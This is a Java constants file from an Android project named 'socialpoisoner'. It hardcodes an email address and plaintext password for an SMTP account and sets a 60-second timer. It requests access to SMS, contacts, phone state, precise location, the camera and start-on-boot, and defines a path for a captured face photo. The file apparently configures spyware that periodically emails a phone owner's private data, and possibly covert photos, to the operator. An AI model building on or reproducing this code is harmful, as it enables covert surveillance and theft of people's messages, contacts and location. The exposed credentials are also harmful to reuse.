package com.cakeman.doctorrabb.socialpoisoner.modules;

import android.Manifest;
import android.os.Environment;

import java.io.File;

/**
 * Created by doctorrabb on 15.07.16.
 *
 * Constants
 *
 */

public class constants {
    public static final String login = "aller.maller2@inbox.ru";
    public static final String password = "Education455";

    public static final String smtpServer = "smtp.mail.ru";
    public static final String to = login;
    public static final String subject = "SocietyPoisoner";
    public static final String from = login;

    public static final int timer = 60000;

    public static final String [] marshmallowPermissions = new String[] {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA
    };

    public static final String facePath = Environment.getExternalStorageDirectory()
            + File.separator +
            Environment.DIRECTORY_DCIM +
            File.separator + "Camera" + File.separator
            + "yourface.png";
}
